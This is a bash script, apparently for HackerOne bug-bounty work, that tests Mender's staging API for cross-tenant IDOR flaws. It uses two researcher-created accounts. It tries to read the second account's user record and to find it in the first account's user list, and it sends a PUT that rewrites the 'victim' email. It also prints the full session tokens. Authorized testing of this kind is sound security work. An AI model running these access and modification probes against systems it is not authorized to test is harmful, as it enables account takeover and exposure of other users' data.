#!/bin/bash
# IMMEDIATE TESTING SCRIPT - Run this NOW!

echo "=========================================="
echo "Northern.tech IMMEDIATE TESTING"
echo "=========================================="
echo ""

# Check if staging is accessible
echo "[1/8] Checking staging accessibility..."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://staging.hosted.mender.io)
if [ "$STATUS" == "301" ] || [ "$STATUS" == "200" ]; then
    echo "✓ Staging is accessible"
else
    echo "✗ Staging returned: $STATUS"
fi

echo ""
echo "=========================================="
echo "STEP 1: CREATE ACCOUNTS"
echo "=========================================="
echo "Open Firefox and go to: https://staging.hosted.mender.io"
echo ""
echo "Create Account 1:"
echo "  Email: your_h1_username@wearehackerone.com"
echo "  Password: <strong password>"
echo ""
echo "Create Account 2:"
echo "  Email: your_h1_username+victim@wearehackerone.com"
echo "  Password: <strong password>"
echo ""
read -p "Press ENTER when accounts are created..."

echo ""
echo "=========================================="
echo "STEP 2: GET TOKENS"
echo "=========================================="
echo ""
read -p "Enter your H1 username: " H1_USER
export H1_USER
echo ""
read -p "Enter Account 1 email: " EMAIL1
read -sp "Enter Account 1 password: " PASS1
echo ""

echo ""
echo "[2/8] Getting token for Account 1..."
TOKEN_A=$(curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: $H1_USER" \
  -d "{\"email\":\"$EMAIL1\",\"password\":\"$PASS1\"}")

if [ -z "$TOKEN_A" ]; then
    echo "✗ Failed to get token for Account 1"
    exit 1
fi

echo "✓ Token A: ${TOKEN_A:0:20}..."
export TOKEN_A

echo ""
read -p "Enter Account 2 email: " EMAIL2
read -sp "Enter Account 2 password: " PASS2
echo ""

echo ""
echo "[3/8] Getting token for Account 2..."
TOKEN_B=$(curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: $H1_USER" \
  -d "{\"email\":\"$EMAIL2\",\"password\":\"$PASS2\"}")

if [ -z "$TOKEN_B" ]; then
    echo "✗ Failed to get token for Account 2"
    exit 1
fi

echo "✓ Token B: ${TOKEN_B:0:20}..."
export TOKEN_B

echo ""
echo "=========================================="
echo "STEP 3: GET USER INFO"
echo "=========================================="

echo ""
echo "[4/8] Getting Account 1 info..."
USER1=$(curl -s https://staging.hosted.mender.io/api/management/v1/useradm/users/me \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-HackerOne-Research: $H1_USER")

USER1_ID=$(echo "$USER1" | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)
USER1_EMAIL=$(echo "$USER1" | grep -o '"email":"[^"]*"' | head -1 | cut -d'"' -f4)

echo "✓ Account 1:"
echo "  ID: $USER1_ID"
echo "  Email: $USER1_EMAIL"

echo ""
echo "[5/8] Getting Account 2 info..."
USER2=$(curl -s https://staging.hosted.mender.io/api/management/v1/useradm/users/me \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "X-HackerOne-Research: $H1_USER")

USER2_ID=$(echo "$USER2" | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)
USER2_EMAIL=$(echo "$USER2" | grep -o '"email":"[^"]*"' | head -1 | cut -d'"' -f4)

echo "✓ Account 2 (VICTIM):"
echo "  ID: $USER2_ID"
echo "  Email: $USER2_EMAIL"

export VICTIM_USER_ID=$USER2_ID

echo ""
echo "=========================================="
echo "STEP 4: CRITICAL IDOR TEST"
echo "=========================================="

echo ""
echo "[6/8] 🚨 TEST 1: Can Account 1 access Account 2's user info?"
echo "Attempting: GET /users/$VICTIM_USER_ID with TOKEN_A"

IDOR_TEST=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  https://staging.hosted.mender.io/api/management/v1/useradm/users/$VICTIM_USER_ID \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-HackerOne-Research: $H1_USER")

HTTP_CODE=$(echo "$IDOR_TEST" | grep "HTTP_CODE:" | cut -d':' -f2)

echo "Response code: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ]; then
    echo ""
    echo "🚨🚨🚨 CRITICAL VULNERABILITY FOUND! 🚨🚨🚨"
    echo "Account 1 CAN access Account 2's user info!"
    echo "This is a cross-tenant IDOR vulnerability!"
    echo ""
    echo "Response:"
    echo "$IDOR_TEST" | head -n -1
    echo ""
    echo "ACTION: Document this in Findings.md immediately!"
elif [ "$HTTP_CODE" == "403" ] || [ "$HTTP_CODE" == "404" ]; then
    echo "✓ Protected - got $HTTP_CODE (expected)"
else
    echo "? Unexpected response: $HTTP_CODE"
fi

echo ""
echo "[7/8] 🚨 TEST 2: Can Account 1 see Account 2 in users list?"
USERS_LIST=$(curl -s https://staging.hosted.mender.io/api/management/v1/useradm/users \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-HackerOne-Research: $H1_USER")

if echo "$USERS_LIST" | grep -q "$USER2_EMAIL"; then
    echo ""
    echo "🚨🚨🚨 CRITICAL VULNERABILITY FOUND! 🚨🚨🚨"
    echo "Account 1 CAN see Account 2 in users list!"
    echo "This is a cross-tenant information disclosure!"
    echo ""
    echo "Account 2 email found: $USER2_EMAIL"
    echo ""
    echo "ACTION: Document this in Findings.md immediately!"
else
    echo "✓ Protected - Account 2 not visible in Account 1's user list"
fi

echo ""
echo "[8/8] 🚨 TEST 3: Can Account 1 modify Account 2?"
MODIFY_TEST=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X PUT \
  https://staging.hosted.mender.io/api/management/v1/useradm/users/$VICTIM_USER_ID \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-HackerOne-Research: $H1_USER" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@example.com"}')

HTTP_CODE=$(echo "$MODIFY_TEST" | grep "HTTP_CODE:" | cut -d':' -f2)

echo "Response code: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "204" ]; then
    echo ""
    echo "🚨🚨🚨 CRITICAL VULNERABILITY FOUND! 🚨🚨🚨"
    echo "Account 1 CAN modify Account 2!"
    echo "This is a critical authorization bypass!"
    echo ""
    echo "ACTION: Document this in Findings.md IMMEDIATELY!"
elif [ "$HTTP_CODE" == "403" ] || [ "$HTTP_CODE" == "404" ]; then
    echo "✓ Protected - got $HTTP_CODE (expected)"
else
    echo "? Unexpected response: $HTTP_CODE"
fi

echo ""
echo "=========================================="
echo "TESTING SUMMARY"
echo "=========================================="
echo ""
echo "Tokens saved in environment:"
echo "  TOKEN_A=$TOKEN_A"
echo "  TOKEN_B=$TOKEN_B"
echo "  VICTIM_USER_ID=$VICTIM_USER_ID"
echo "  H1_USER=$H1_USER"
echo ""
echo "Next steps:"
echo "1. Review results above for vulnerabilities"
echo "2. If found vulnerabilities - document in Findings.md"
echo "3. Test devices: python3 scripts/test_idor.py"
echo "4. Test deployments"
echo "5. Check XSS in device names"
echo ""
echo "Quick commands:"
echo "  # Test devices IDOR"
echo "  python3 scripts/test_idor.py"
echo ""
echo "  # Interactive API testing"
echo "  python3 scripts/mender_api_client.py"
echo ""
echo "=========================================="
echo "READY FOR DETAILED TESTING!"
echo "=========================================="
